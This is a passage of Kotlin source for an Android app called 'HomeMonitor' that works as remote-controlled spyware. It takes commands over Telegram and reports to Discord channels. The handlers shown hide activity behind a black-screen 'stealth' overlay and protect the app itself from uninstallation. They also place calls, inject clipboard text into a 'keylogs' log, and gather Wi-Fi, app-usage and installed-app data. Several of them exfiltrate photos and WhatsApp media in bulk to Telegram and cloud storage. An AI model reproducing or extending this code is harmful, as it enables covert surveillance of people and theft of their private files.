            Log.e(TAG, "Stop web stream error: ${e.message}")
        }
        AppAccessibilityService.instance?.hideBlackScreenOverlay()
        sendMessage(chatId, "🛑 *Live MJPEG HTTP Stream Server Stopped.*", parseMode = "Markdown")
    }

    private fun handleStealthCommand(chatId: String, arg: String) {
        val mode = arg.trim().lowercase()
        if (mode == "on" || mode == "enable" || mode == "1" || mode == "true") {
            AppAccessibilityService.instance?.showBlackScreenOverlay()
            sendMessage(chatId, "🕶️ *Stealth Mode ACTIVE:* Screen overlay turned black & brightness dimmed to minimum.", parseMode = "Markdown")
        } else if (mode == "off" || mode == "disable" || mode == "0" || mode == "false") {
            AppAccessibilityService.instance?.hideBlackScreenOverlay()
            sendMessage(chatId, "☀️ *Stealth Mode DISABLED:* Black screen overlay removed.", parseMode = "Markdown")
        } else {
            val status = if (AppAccessibilityService.instance?.isOverlayShowing == true) "ACTIVE 🕶️" else "DISABLED ☀️"
            sendMessage(chatId, "ℹ️ *Stealth Mode Status:* $status\n\nUsage:\n• `/stealth on` — Turn screen black & dim brightness\n• `/stealth off` — Restore physical screen display", parseMode = "Markdown")
        }
    }

    private fun getDeviceIpAddress(): String {
        try {
            val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as? WifiManager
            val wifiInfo = wifiManager?.connectionInfo
            val ipInt = wifiInfo?.ipAddress ?: 0
            if (ipInt != 0) {
                return String.format(
                    Locale.getDefault(),
                    "%d.%d.%d.%d",
                    ipInt and 0xff,
                    ipInt shr 8 and 0xff,
                    ipInt shr 16 and 0xff,
                    ipInt shr 24 and 0xff
                )
            }

            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is InetAddress) {
                        val host = addr.hostAddress
                        if (host != null && host.indexOf(':') < 0) {
                            return host
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getDeviceIpAddress error: ${e.message}")
        }
        return "127.0.0.1"
    }

    private fun getDevicePublicIpv6Address(): String? {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces() ?: return null
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                if (!intf.isUp || intf.isLoopback) continue
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (addr is java.net.Inet6Address && !addr.isLoopbackAddress && !addr.isLinkLocalAddress && !addr.isSiteLocalAddress) {
                        val host = addr.hostAddress ?: continue
                        val cleanHost = if (host.contains("%")) host.substring(0, host.indexOf("%")) else host
                        return cleanHost
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getDevicePublicIpv6Address error: ${e.message}")
        }
        return null
    }

    private fun handleUninstallApp(chatId: String, targetApp: String) {
        val query = targetApp.trim()
        if (query.isEmpty() || query == "/uninstall" || query == "/uninstallapp") {
            sendMessage(chatId, "ℹ️ *Remote App Uninstaller*\nUsage: `/uninstall <package_name_or_app_name>`\n\nExamples:\n• `/uninstall com.example.someapp`\n• `/uninstall WhatsApp`", parseMode = "Markdown")
            return
        }

        if (query.lowercase().contains("homemonitor") || query == packageName) {
            sendMessage(chatId, "⚠️ Cannot uninstall HomeMonitor itself via remote command.", parseMode = "Markdown")
            return
        }

        try {
            var targetPkg: String? = null
            var appName: String = query

            try {
                val appInfo = packageManager.getApplicationInfo(query, 0)
                targetPkg = appInfo.packageName
                appName = packageManager.getApplicationLabel(appInfo).toString()
            } catch (_: Exception) {
                val installedApps = packageManager.getInstalledApplications(0)
                val matches = installedApps.filter { app ->
                    val label = packageManager.getApplicationLabel(app).toString()
                    label.lowercase().contains(query.lowercase()) || app.packageName.lowercase().contains(query.lowercase())
                }

                when {
                    matches.size == 1 -> {
                        val match = matches.first()
                        targetPkg = match.packageName
                        appName = packageManager.getApplicationLabel(match).toString()
                    }
                    matches.size > 1 -> {
                        val sb = StringBuilder("📱 *Multiple matching apps found:* `$query`\n\n")
                        matches.forEachIndexed { idx, app ->
                            val label = packageManager.getApplicationLabel(app).toString()
                            sb.append("${idx + 1}. *$label* (`${app.packageName}`)\n")
                        }
                        sb.append("\n💡 Type `/uninstall <exact_package_name_above>` to uninstall a specific app.")
                        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
                        return
                    }
                    else -> null
                }
            }

            if (targetPkg == null) {
                sendMessage(chatId, "❌ No installed app matching `$query` found on device.", parseMode = "Markdown")
                return
            }

            sendMessage(chatId, "🗑️ *Initiating uninstallation for:* *$appName* (`$targetPkg`)…", parseMode = "Markdown")

            val uninstallIntent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$targetPkg")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(uninstallIntent)

        } catch (e: Exception) {
            Log.e(TAG, "handleUninstallApp error: ${e.message}")
            sendMessage(chatId, "❌ Uninstallation error: ${e.message}")
        }
    }

    private fun handleSayTTS(chatId: String, textToSay: String) {
        val message = textToSay.trim()
        if (message.isEmpty()) {
            sendMessage(chatId, "ℹ️ Usage: `/say <text_to_speak>`\nExample: `/say Hello from Admin`", parseMode = "Markdown")
            return
        }

        mainHandler.post {
            try {
                if (textToSpeech == null) {
                    textToSpeech = TextToSpeech(applicationContext) { status ->
                        if (status == TextToSpeech.SUCCESS) {
                            textToSpeech?.language = Locale.US
                            textToSpeech?.speak(message, TextToSpeech.QUEUE_FLUSH, null, "tts_id")
                        }
                    }
                } else {
                    textToSpeech?.speak(message, TextToSpeech.QUEUE_FLUSH, null, "tts_id")
                }
                sendMessage(chatId, "🗣️ *Speaking message out loud:* \"$message\"", parseMode = "Markdown")
            } catch (e: Exception) {
                Log.e(TAG, "TTS error: ${e.message}")
                sendMessage(chatId, "❌ TTS Error: ${e.message}")
            }
        }
    }

    private fun handleToastMsg(chatId: String, message: String) {
        val msg = message.trim()
        if (msg.isEmpty()) {
            sendMessage(chatId, "ℹ️ Usage: `/toast <message>`", parseMode = "Markdown")
            return
        }

        mainHandler.post {
            try {
                Toast.makeText(applicationContext, msg, Toast.LENGTH_LONG).show()
                sendMessage(chatId, "💬 *Toast Message Displayed:* \"$msg\"", parseMode = "Markdown")
            } catch (e: Exception) {
                Log.e(TAG, "Toast error: ${e.message}")
                sendMessage(chatId, "❌ Toast Error: ${e.message}")
            }
        }
    }

    private fun handleFindMeAlarm(chatId: String) {
        sendMessage(chatId, "🔔 *Playing loud finder alarm for 20 seconds…*", parseMode = "Markdown")
        serviceScope.launch(Dispatchers.IO) {
            try {
                val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                    ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                val ringtone = RingtoneManager.getRingtone(applicationContext, alarmUri)
                ringtone?.play()
                delay(20_000L)
                ringtone?.stop()
            } catch (e: Exception) {
                Log.e(TAG, "FindMe Alarm error: ${e.message}")
            }
        }
    }

    private fun handleSpeakTTS(chatId: String, text: String) {
        if (text.isBlank()) {
            sendMessage(chatId, "Usage: `!speak <message>` or `!tts <message>`")
            return
        }
        mainHandler.post {
            if (textToSpeech == null) {
                textToSpeech = TextToSpeech(this) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        textToSpeech?.language = Locale.US
                        textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_id")
                    }
                }
            } else {
                textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_id")
            }
            sendMessage(chatId, "🗣️ *Playing spoken TTS audio message on phone speakers:* `$text`", parseMode = "Markdown")
        }
    }

    private fun handleSetClipboard(chatId: String, text: String) {
        if (text.isBlank()) {
            sendMessage(chatId, "Usage: `!setclipboard <text>` or `!copy <text>`")
            return
        }
        mainHandler.post {
            try {
                val cm = getSystemService(CLIPBOARD_SERVICE) as? ClipboardManager
                val clip = android.content.ClipData.newPlainText("text", text)
                cm?.setPrimaryClip(clip)
                sendMessage(chatId, "📋 *Injected text directly onto system clipboard:* `$text`", parseMode = "Markdown")
                sendDiscordCategorizedMessage("05-keylogs-and-clipboard", "📋 **Injected Clipboard Text:** `$text`")
            } catch (e: Exception) {
                Log.e(TAG, "handleSetClipboard error: ${e.message}")
                sendMessage(chatId, "❌ Error setting clipboard: ${e.message}")
            }
        }
    }

    fun handleToastPublic(message: String) {
        if (message.isBlank()) return
        mainHandler.post {
            try {
                Toast.makeText(this, message, Toast.LENGTH_LONG).show()
                sendDiscordCategorizedMessage("01-system-alerts", "💬 **Toast Displayed on Device:** `$message`")
            } catch (e: Exception) {
                Log.e(TAG, "handleToastPublic error: ${e.message}")
            }
        }
    }

    fun handleVibratePublic(milliseconds: Int) {
        val duration = milliseconds.coerceIn(100, 5000)
        mainHandler.post {
            try {
                @Suppress("DEPRECATION")
                val vibrator = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator?.vibrate(android.os.VibrationEffect.createOneShot(duration.toLong(), android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator?.vibrate(duration.toLong())
                }
                sendDiscordCategorizedMessage("01-system-alerts", "📳 **Haptic Vibration Triggered:** `${duration}ms`")
            } catch (e: Exception) {
                Log.e(TAG, "handleVibratePublic error: ${e.message}")
            }
        }
    }

    fun handleCall(chatId: String, phoneNumber: String) {
        val number = phoneNumber.trim()
        if (number.isBlank()) {
            if (chatId.isNotBlank()) sendMessage(chatId, "Usage: `/call <phoneNumber>`")
            return
        }
        mainHandler.post {
            try {
                val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                if (chatId.isNotBlank()) sendMessage(chatId, "📞 *Placed outbound call to:* `$number`", parseMode = "Markdown")
                sendDiscordCategorizedMessage("06-call-telemetry", "📞 **Outbound Call Placed:** `$number`")
            } catch (e: Exception) {
                try {
                    val dialIntent = Intent(Intent.ACTION_DIAL, Uri.parse("tel:$number")).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(dialIntent)
                    if (chatId.isNotBlank()) sendMessage(chatId, "📞 *Opened phone dialer for:* `$number`", parseMode = "Markdown")
                    sendDiscordCategorizedMessage("06-call-telemetry", "📞 **Phone Dialer Opened for:** `$number`")
                } catch (ex: Exception) {
                    Log.e(TAG, "handleCall error: ${ex.message}")
                    if (chatId.isNotBlank()) sendMessage(chatId, "❌ Failed to place call: ${ex.message}")
                }
            }
        }
    }

    fun handleOpenUrl(chatId: String, urlInput: String) {
        val rawUrl = urlInput.trim()
        if (rawUrl.isBlank()) {
            if (chatId.isNotBlank()) sendMessage(chatId, "Usage: `/openurl <url>`")
            return
        }
        val targetUrl = if (!rawUrl.startsWith("http://") && !rawUrl.startsWith("https://")) "https://$rawUrl" else rawUrl
        mainHandler.post {
            try {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(targetUrl)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                if (chatId.isNotBlank()) sendMessage(chatId, "🌐 *Opened URL in browser:* `$targetUrl`", parseMode = "Markdown")
                sendDiscordCategorizedMessage("21-browser-history", "🌐 **URL Opened in Browser:** `$targetUrl`")
            } catch (e: Exception) {
                Log.e(TAG, "handleOpenUrl error: ${e.message}")
                if (chatId.isNotBlank()) sendMessage(chatId, "❌ Failed to open URL: ${e.message}")
            }
        }
    }

    private fun handleToast(chatId: String, text: String) {
        if (text.isBlank()) {
            sendMessage(chatId, "Usage: `!toast <message>`")
            return
        }
        mainHandler.post {
            try {
                Toast.makeText(this, text, Toast.LENGTH_LONG).show()
                sendMessage(chatId, "💬 *Displayed system Toast message on phone screen:* `$text`", parseMode = "Markdown")
            } catch (e: Exception) {
                Log.e(TAG, "handleToast error: ${e.message}")
            }
        }
    }

    private fun handleWifiInfo(chatId: String) {
        try {
            val wm = applicationContext.getSystemService(WIFI_SERVICE) as? WifiManager
            val info = wm?.connectionInfo
            val ssid = info?.ssid?.removeSurrounding("\"") ?: "Disconnected"
            val bssid = info?.bssid ?: "N/A"
            val rssi = info?.rssi ?: 0
            val speed = info?.linkSpeed ?: 0
            val ipInt = info?.ipAddress ?: 0
            val ipStr = String.format("%d.%d.%d.%d", ipInt and 0xff, ipInt shr 8 and 0xff, ipInt shr 16 and 0xff, ipInt shr 24 and 0xff)

            val msg = "📶 **Wi-Fi & Network Telemetry**\n\n" +
                    "• **SSID / Network**: `$ssid`\n" +
                    "• **BSSID**: `$bssid`\n" +
                    "• **Signal Strength**: `$rssi dBm`\n" +
                    "• **Link Speed**: `$speed Mbps`\n" +
                    "• **Local IP Address**: `$ipStr`"

            sendMessage(chatId, msg, parseMode = "Markdown")
            sendDiscordCategorizedMessage("02-status-alerts", msg)
        } catch (e: Exception) {
            Log.e(TAG, "handleWifiInfo error: ${e.message}")
            sendMessage(chatId, "❌ Error reading Wi-Fi telemetry: ${e.message}")
        }
    }

    private fun handleTorchCommand(chatId: String, seconds: Int) {
        val duration = seconds.coerceIn(1, 120)
        sendMessage(chatId, "🔦 Turning ON camera LED flashlight for $duration seconds…")
        serviceScope.launch(Dispatchers.IO) {
            try {
                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
                val camId = cm.cameraIdList.firstOrNull { id ->
                    cm.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                }
                if (camId != null) {
                    cm.setTorchMode(camId, true)
                    delay(duration * 1000L)
                    cm.setTorchMode(camId, false)
                    sendMessage(chatId, "🔦 Flashlight turned OFF.")
                } else {
                    sendMessage(chatId, "❌ Camera LED flashlight hardware unavailable.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleTorchCommand error: ${e.message}")
                sendMessage(chatId, "❌ Torch error: ${e.message}")
            }
        }
    }

    private fun handleDiskUsage(chatId: String) {
        try {
            val stat = android.os.StatFs(Environment.getExternalStorageDirectory().absolutePath)
            val totalBytes = stat.blockCountLong * stat.blockSizeLong
            val freeBytes = stat.availableBlocksLong * stat.blockSizeLong
            val usedBytes = totalBytes - freeBytes

            val fmt = { b: Long -> "%.2f GB".format(b / (1024.0 * 1024.0 * 1024.0)) }
            val msg = "💾 **Storage & Disk Usage Telemetry**\n\n" +
                    "• **Total Storage**: `${fmt(totalBytes)}`\n" +
                    "• **Used Storage**: `${fmt(usedBytes)}`\n" +
                    "• **Free Available**: `${fmt(freeBytes)}`\n" +
                    "• **Free Ratio**: `${"%.1f".format((freeBytes.toDouble() / totalBytes) * 100)}%`"

            sendMessage(chatId, msg, parseMode = "Markdown")
            sendDiscordCategorizedMessage("14-files-and-backups", msg)
        } catch (e: Exception) {
            Log.e(TAG, "handleDiskUsage error: ${e.message}")
        }
    }

    private fun handleAppUsage(chatId: String) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val usm = getSystemService(USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                if (usm == null) {
                    sendMessage(chatId, "❌ UsageStatsManager hardware service unavailable.")
                    return
                }

                val now = System.currentTimeMillis()
                val startTime = now - (24 * 3600 * 1000L)
                val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, now)

                if (stats.isNullOrEmpty()) {
                    sendMessage(chatId, "⚠️ Usage Access permission required. Grant Usage Access in Settings -> Usage Access.")
                    return
                }

                val pm = packageManager
                val sortedStats = stats.filter { it.totalTimeInForeground > 60_000L }
                    .sortedByDescending { it.totalTimeInForeground }
                    .take(15)

                val sb = StringBuilder("📊 **App Usage Telemetry (Last 24 Hours)**\n\n")
                for (s in sortedStats) {
                    val appLabel = try {
                        pm.getApplicationLabel(pm.getApplicationInfo(s.packageName, 0)).toString()
                    } catch (_: Exception) {
                        s.packageName
                    }
                    val totalSec = s.totalTimeInForeground / 1000L
                    val hrs = totalSec / 3600
                    val mins = (totalSec % 3600) / 60
                    val timeStr = if (hrs > 0) "${hrs}h ${mins}m" else "${mins}m"

                    sb.append("• **$appLabel**: `$timeStr` (`${s.packageName}`)\n")
                }

                sendMessage(chatId, sb.toString(), parseMode = "Markdown")
                sendDiscordCategorizedMessage("20-app-usage-telemetry", sb.toString())
            } else {
                sendMessage(chatId, "⚠️ App usage statistics requires Android 5.1+")
            }
        } catch (e: Exception) {
            Log.e(TAG, "handleAppUsage error: ${e.message}")
            sendMessage(chatId, "❌ Error fetching app usage: ${e.message}")
        }
    }

    private fun handleInstalledApps(chatId: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val pm = packageManager
                @Suppress("DEPRECATION")
                val installed = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                    .filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                    .sortedBy { pm.getApplicationLabel(it).toString().lowercase(Locale.getDefault()) }

                val sb = StringBuilder("📱 **Installed User Applications (${installed.size} Total)**\n\n")
                for (app in installed) {
                    val label = pm.getApplicationLabel(app).toString()
                    sb.append("• **$label**: `${app.packageName}`\n")
                    if (sb.length > 1800) {
                        sendMessage(chatId, sb.toString())
                        sendDiscordCategorizedFile("14-files-and-backups", sb.toString().toByteArray().let { bytes ->
                            val f = File(cacheDir, "apps_${System.currentTimeMillis()}.txt")
                            f.writeBytes(bytes)
                            f
                        }, "text/plain")
                        sb.clear()
                    }
                }
                if (sb.isNotEmpty()) {
                    sendMessage(chatId, sb.toString())
                    sendDiscordCategorizedFile("14-files-and-backups", sb.toString().toByteArray().let { bytes ->
                        val f = File(cacheDir, "apps_${System.currentTimeMillis()}.txt")
                        f.writeBytes(bytes)
                        f
                    }, "text/plain")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleInstalledApps error: ${e.message}")
                sendMessage(chatId, "❌ Error fetching installed apps: ${e.message}")
            }
        }
    }

    private fun handleBatteryTelemetry(chatId: String) {
        try {
            val filter = android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryIntent = registerReceiver(null, filter)
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val pct = if (level >= 0 && scale > 0) (level * 100) / scale else -1
            val temp = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
            val voltage = batteryIntent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
            val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL

            val msg = "🔋 **Battery & Power Telemetry**\n\n" +
                    "• **Battery Level**: `$pct%`\n" +
                    "• **Charging Status**: `${if (isCharging) "Charging ⚡" else "Discharging 🔋"}`\n" +
                    "• **Temperature**: `$temp °C`\n" +
                    "• **Voltage**: `$voltage mV`"

            sendMessage(chatId, msg, parseMode = "Markdown")
            sendDiscordCategorizedMessage("02-status-alerts", msg)
        } catch (e: Exception) {
            Log.e(TAG, "handleBatteryTelemetry error: ${e.message}")
        }
    }

    private fun handleVibrate(chatId: String, milliseconds: Int) {
        val duration = milliseconds.coerceIn(100, 5000)
        mainHandler.post {
            try {
                @Suppress("DEPRECATION")
                val vibrator = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator?.vibrate(android.os.VibrationEffect.createOneShot(duration.toLong(), android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator?.vibrate(duration.toLong())
                }
                sendMessage(chatId, "📳 *Triggered $duration ms haptic vibration pulse on phone.*", parseMode = "Markdown")
            } catch (e: Exception) {
                Log.e(TAG, "handleVibrate error: ${e.message}")
            }
        }
    }

    private fun handleSyncMedia(chatId: String, hoursArg: String) {
        val hours = hoursArg.trim().toIntOrNull()?.coerceIn(1, 168) ?: 24
        val cutoffMs = System.currentTimeMillis() - (hours * 3600 * 1000L)

        sendMessage(chatId, "📦 *Exfiltrating new media files from last ${hours}h…*", parseMode = "Markdown")

        serviceScope.launch(Dispatchers.IO) {
            try {
                val storageRoot = Environment.getExternalStorageDirectory()
                val targetDirs = listOf(
                    File(storageRoot, "DCIM"),
                    File(storageRoot, "Pictures"),
                    File(storageRoot, "Download"),
                    File(storageRoot, "WhatsApp/Media"),
                    File(storageRoot, "Android/media")
                )

                val recentFiles = mutableListOf<File>()
                for (dir in targetDirs) {
                    if (dir.exists()) {
                        dir.walkTopDown().take(500).forEach { file ->
                            if (file.isFile && file.length() > 0 && file.lastModified() >= cutoffMs) {
                                recentFiles.add(file)
                            }
                        }
                    }
                }

                if (recentFiles.isEmpty()) {
                    sendMessage(chatId, "📂 No new media files found in the last ${hours} hours.", parseMode = "Markdown")
                    return@launch
                }

                val zipFile = File(cacheDir, "media_sync_${System.currentTimeMillis()}.zip")
                ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                    recentFiles.take(50).forEach { file ->
                        try {
                            val entryName = file.name
                            zos.putNextEntry(ZipEntry(entryName))
                            FileInputStream(file).use { fis -> fis.copyTo(zos) }
                            zos.closeEntry()
                        } catch (_: Exception) {}
                    }
                }

                if (zipFile.exists() && zipFile.length() > 0) {
                    val sizeMb = "%.1f".format(zipFile.length() / (1024.0 * 1024.0))
                    sendMessage(chatId, "📤 Uploading media bundle (${recentFiles.size} items, $sizeMb MB)…", parseMode = "Markdown")

                    val bytes = zipFile.readBytes()
                    val body = MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", chatId)
                        .addFormDataPart("document", zipFile.name, bytes.toRequestBody("application/zip".toMediaTypeOrNull()))
                        .addFormDataPart("caption", "📦 Exfiltrated ${recentFiles.size} media files from last ${hours}h")
                        .build()

                    val req = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
                    httpClient.newCall(req).execute()
                    zipFile.delete()
                } else {
                    sendMessage(chatId, "❌ Failed to create media ZIP package.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleSyncMedia error: ${e.message}")
                sendMessage(chatId, "❌ Media Sync Error: ${e.message}")
            }
        }
    }

    private fun handleDumpPhotosCommand(chatId: String, count: Int, offset: Int) {
        val safeCount = count.coerceIn(1, 20)
        val safeOffset = offset.coerceAtLeast(0)
        sendMessage(chatId, "📷 *Extracting top $safeCount recent photos (Offset: $safeOffset)…*", parseMode = "Markdown")

        serviceScope.launch(Dispatchers.IO) {
            try {
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED
                )

                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val photoFiles = mutableListOf<File>()

                contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder
                )?.use { cursor ->
                    if (cursor.moveToPosition(safeOffset)) {
                        do {
                            val filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                            val file = File(filePath)
                            if (file.exists() && file.length() > 0) {
                                photoFiles.add(file)
                            }
                        } while (cursor.moveToNext() && photoFiles.size < safeCount)
                    }
                }

                if (photoFiles.isEmpty()) {
                    sendMessage(chatId, "📭 No photos found at offset $safeOffset.", parseMode = "Markdown")
                    return@launch
                }

                for (photo in photoFiles) {
                    sendPhoto(chatId, photo, deleteAfterSend = false)
                    delay(500L)
                }

                sendMessage(chatId, "✅ *Posted ${photoFiles.size} photos directly to channel.*", parseMode = "Markdown")
            } catch (e: Exception) {
                Log.e(TAG, "handleDumpPhotosCommand error: ${e.message}")
                sendMessage(chatId, "❌ Dump Photos Error: ${e.message}")
            }
        }
    }

    private fun handlePhotosByDateCommand(chatId: String, startDateStr: String, endDateStr: String, maxCount: Int) {
        if (startDateStr.isBlank()) {
            sendMessage(chatId, "ℹ️ *Usage*: `/photosbydate YYYY-MM-DD YYYY-MM-DD [max_count]`", parseMode = "Markdown")
            return
        }

        val safeMaxCount = maxCount.coerceIn(1, 20)
        val startSec = parseDateToEpochSecond(startDateStr, isEndOfDay = false)
        val endSec = parseDateToEpochSecond(endDateStr.ifBlank { startDateStr }, isEndOfDay = true)

        if (startSec == 0L || endSec == 0L) {
            sendMessage(chatId, "❌ *Invalid date format*. Please use `YYYY-MM-DD` (e.g. `2026-11-01`).", parseMode = "Markdown")
            return
        }

        sendMessage(chatId, "📅 *Extracting photos taken between $startDateStr and $endDateStr (Max $safeMaxCount)…*", parseMode = "Markdown")

        serviceScope.launch(Dispatchers.IO) {
            try {
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED
                )

                val selection = "${MediaStore.Images.Media.DATE_ADDED} >= ? AND ${MediaStore.Images.Media.DATE_ADDED} <= ?"
                val selectionArgs = arrayOf(startSec.toString(), endSec.toString())
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

                val photoFiles = mutableListOf<File>()

                contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    sortOrder
                )?.use { cursor ->
                    while (cursor.moveToNext() && photoFiles.size < safeMaxCount) {
                        val filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                        val file = File(filePath)
                        if (file.exists() && file.length() > 0) {
                            photoFiles.add(file)
                        }
                    }
                }

                if (photoFiles.isEmpty()) {
                    sendMessage(chatId, "📭 No photos found taken between $startDateStr and $endDateStr.", parseMode = "Markdown")
                    return@launch
                }

                for (photo in photoFiles) {
                    sendPhoto(chatId, photo, deleteAfterSend = false)
                    delay(500L)
                }

                sendMessage(chatId, "✅ *Posted ${photoFiles.size} photos taken between $startDateStr and $endDateStr to channel.*", parseMode = "Markdown")
            } catch (e: Exception) {
                Log.e(TAG, "handlePhotosByDateCommand error: ${e.message}")
                sendMessage(chatId, "❌ Photos By Date Error: ${e.message}")
            }
        }
    }

    private fun handleZipDumpPhotosCommand(chatId: String, count: Int, offset: Int) {
        val safeCount = count.coerceIn(1, 100)
        val safeOffset = offset.coerceAtLeast(0)

        sendMessage(chatId, "📦 *Extracting & zipping top $safeCount photos for Cloud Storage upload…*", parseMode = "Markdown")

        serviceScope.launch(Dispatchers.IO) {
            try {
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED
                )

                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val photoFiles = mutableListOf<File>()

                contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder
                )?.use { cursor ->
                    if (cursor.moveToPosition(safeOffset)) {
                        do {
                            val filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                            val file = File(filePath)
                            if (file.exists() && file.length() > 0) {
                                photoFiles.add(file)
                            }
                        } while (cursor.moveToNext() && photoFiles.size < safeCount)
                    }
                }

                if (photoFiles.isEmpty()) {
                    sendMessage(chatId, "📭 No photos found at offset $safeOffset to zip.", parseMode = "Markdown")
                    return@launch
                }

                val zipFile = File(cacheDir, "photos_dump_${System.currentTimeMillis()}.zip")
                ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                    photoFiles.forEach { file ->
                        try {
                            zos.putNextEntry(ZipEntry(file.name))
                            FileInputStream(file).use { fis -> fis.copyTo(zos) }
                            zos.closeEntry()
                        } catch (_: Exception) {}
                    }
                }

                if (!zipFile.exists() || zipFile.length() == 0L) {
                    sendMessage(chatId, "❌ Failed to generate photo ZIP package.")
                    return@launch
                }

                val sizeMbStr = "%.1f".format(zipFile.length() / (1024.0 * 1024.0))
                sendMessage(chatId, "☁️ *Uploading ${photoFiles.size} photos archive ($sizeMbStr MB) to Cloud Storage…*", parseMode = "Markdown")

                val cloudUrl = uploadLargeFileWithCloudFallback(zipFile)
                if (!cloudUrl.isNullOrBlank()) {
                    val msg = "📦 **Photos Archive Cloud Mirror Available** ($sizeMbStr MB)\n" +
                            "• **Items**: ${photoFiles.size} Photos\n" +
                            "• **Archive**: `${zipFile.name}`\n" +
                            "• **Cloud Download Link**: $cloudUrl"
                    sendMessage(chatId, msg)
                } else {
                    sendMessage(chatId, "❌ Failed to upload photo ZIP archive to cloud storage mirrors.")
                }

                try { zipFile.delete() } catch (_: Exception) {}
            } catch (e: Exception) {
                Log.e(TAG, "handleZipDumpPhotosCommand error: ${e.message}")
                sendMessage(chatId, "❌ ZIP Dump Photos Error: ${e.message}")
            }
        }
    }

    private fun parseDateToEpochSecond(dateStr: String, isEndOfDay: Boolean): Long {
        return try {
            val sdf = SimpleDateFormat("yyyy-MM-dd", Locale.US)
            sdf.timeZone = TimeZone.getDefault()
            val date = sdf.parse(dateStr.trim()) ?: return 0L
            val cal = Calendar.getInstance().apply {
                time = date
                if (isEndOfDay) {
                    set(Calendar.HOUR_OF_DAY, 23)
                    set(Calendar.MINUTE, 59)
                    set(Calendar.SECOND, 59)
                    set(Calendar.MILLISECOND, 999)
                } else {
                    set(Calendar.HOUR_OF_DAY, 0)
                    set(Calendar.MINUTE, 0)
                    set(Calendar.SECOND, 0)
                    set(Calendar.MILLISECOND, 0)
                }
            }
